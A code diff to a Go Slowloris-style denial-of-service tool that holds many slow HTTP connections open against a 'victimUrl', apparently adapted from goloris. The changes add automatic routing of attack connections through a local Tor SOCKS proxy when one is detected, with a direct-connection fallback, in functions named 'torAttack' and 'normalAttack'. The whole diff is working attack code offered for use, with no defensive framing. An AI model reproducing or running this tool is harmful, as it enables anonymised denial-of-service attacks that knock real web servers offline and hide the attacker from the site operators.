@@ -16,7 +16,6 @@ import (
 	"strings"
 	"time"
 	"errors"
-
 	"golang.org/x/net/proxy"
 )
 
@@ -26,14 +25,15 @@ var (
 	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
 	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
 	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
-	testDuration     = flag.Duration("testDuration", time.Hour*3600, "Test duration")
+	testDuration     = flag.Duration("testDuration", time.Second*120, "Test duration")
 	victimUrl        = flag.String("victimUrl", "http://victim.com/", "Victim's url. Http POST must be allowed in nginx config for this url")
 	hostHeader        = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
 )
 
 var (
-	sharedReadBuf  = make([]byte, 1024)
+	sharedReadBuf  = make([]byte, 128)
 	sharedWriteBuf = []byte("A")
+	isTorRunning    = true
 
 	tlsConfig = &tls.Config{
 		InsecureSkipVerify: true,
@@ -76,6 +76,10 @@ func main() {
 	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
 	activeConnectionsCh := make(chan int, *dialWorkersCount)
 	go activeConnectionsCounter(activeConnectionsCh)
+
+	// Check Tor Proxy
+	go checkIsTorRunning()
+
 	for i := 0; i < *dialWorkersCount; i++ {
 		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
 		time.Sleep(dialWorkersLaunchInterval)
@@ -105,43 +109,13 @@ func activeConnectionsCounter(ch <-chan int) {
 func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	// TODO hint: add support for dialing the victim via a random proxy
 	// from the given pool.
-	// Setup Proxy 
-	var s sled
-	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, &s)
-	// tbProxyURL, err := url.Parse("socks5://127.0.0.1:9050")
-	if err != nil {
-		log.Fatalf("Failed to parse proxy URL: %v\n", err)
-	}
 
-	// tbDialer, err := proxy.FromURL(tbProxyURL, proxy.Direct)
-
-	conn, err := dialer.Dial("tcp", hostPort)
-	if err != nil {
-		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
-		return nil
+	// Attact via Tor or nomal
+	if isTorRunning {
+		return torAttack(hostPort, isTls)
+	} else {
+		return normalAttack(hostPort, isTls)	
 	}
-
-	tcpConn := s.tcp
-	if err = tcpConn.SetReadBuffer(128); err != nil {
-		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
-	}
-	if err = tcpConn.SetWriteBuffer(128); err != nil {
-		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
-	}
-	if err = tcpConn.SetLinger(0); err != nil {
-		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
-	}
-	if !isTls {
-		return tcpConn
-	}
-
-	tlsConn := tls.Client(conn, tlsConfig)
-	if err = tlsConn.Handshake(); err != nil {
-		conn.Close()
-		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
-		return nil
-	}
-	return tlsConn
 }
 
 func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
@@ -192,4 +166,92 @@ func (s *sled) Dial(network, address string) (net.Conn, error) { // satisfies pr
                 return c, nil
         }
         return nil, errors.New("not implemented yet")
+}
+
+func checkIsTorRunning() {
+	log.Printf(">>> Checking is Tor running")
+
+	// Setup Proxy 
+	var s sled
+	var hostPort = "google.com:80"
+	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, &s)
+	conn, err := dialer.Dial("tcp", hostPort)
+	if err != nil {
+		log.Printf(">>> Tor is not running on this machine")
+		isTorRunning = false
+	} else {
+		log.Printf(">>> Tor is running. Let's using Tor")
+		conn.Close()	
+	}
+}
+
+func torAttack(hostPort string, isTls bool) io.ReadWriteCloser {
+	// Setup Proxy
+	var s sled
+	dialer, err := proxy.SOCKS5("tcp", "127.0.0.1:9050", nil, &s)
+
+	if err != nil {
+		log.Fatalf("Failed to parse proxy URL: %v\n", err)
+	}
+
+	// tbDialer, err := proxy.FromURL(tbProxyURL, proxy.Direct)
+
+	conn, err := dialer.Dial("tcp", hostPort)
+	if err != nil {
+		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+
+	tcpConn := s.tcp
+	if err = tcpConn.SetReadBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetWriteBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetLinger(0); err != nil {
+		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
+	}
+	if !isTls {
+		return tcpConn
+	}
+
+	tlsConn := tls.Client(conn, tlsConfig)
+	if err = tlsConn.Handshake(); err != nil {
+		conn.Close()
+		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+	return tlsConn
+}
+
+func normalAttack(hostPort string, isTls bool) io.ReadWriteCloser {
+	// TODO hint: add support for dialing the victim via a random proxy
+	// from the given pool.
+	conn, err := net.Dial("tcp", hostPort)
+	if err != nil {
+		log.Printf("Couldn't esablish connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+	tcpConn := conn.(*net.TCPConn)
+	if err = tcpConn.SetReadBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP read buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetWriteBuffer(128); err != nil {
+		log.Fatalf("Cannot shrink TCP write buffer: [%s]\n", err)
+	}
+	if err = tcpConn.SetLinger(0); err != nil {
+		log.Fatalf("Cannot disable TCP lingering: [%s]\n", err)
+	}
+	if !isTls {
+		return tcpConn
+	}
+
+	tlsConn := tls.Client(conn, tlsConfig)
+	if err = tlsConn.Handshake(); err != nil {
+		conn.Close()
+		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
+		return nil
+	}
+	return tlsConn
 }
